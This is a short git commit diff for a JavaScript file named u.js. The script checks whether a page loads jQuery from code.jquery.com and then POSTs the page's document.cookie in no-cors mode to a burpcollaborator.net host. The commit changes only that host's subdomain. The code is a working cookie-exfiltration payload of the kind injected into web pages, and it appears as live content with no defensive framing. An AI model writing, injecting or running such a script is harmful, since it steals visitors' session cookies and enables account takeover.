fd0bcab2d04dad8799ce16b5874d847ba1537bbc
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-03 21:52:24 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,6 +1,6 @@
 var reg=/code\.jquery.com/ig;
 if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
-fetch('https://dfww2b87wdubm267htmctazhm8sygn.burpcollaborator.net', {
+fetch('https://xxdfww2b87wdubm267htmctazhm8sygn.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
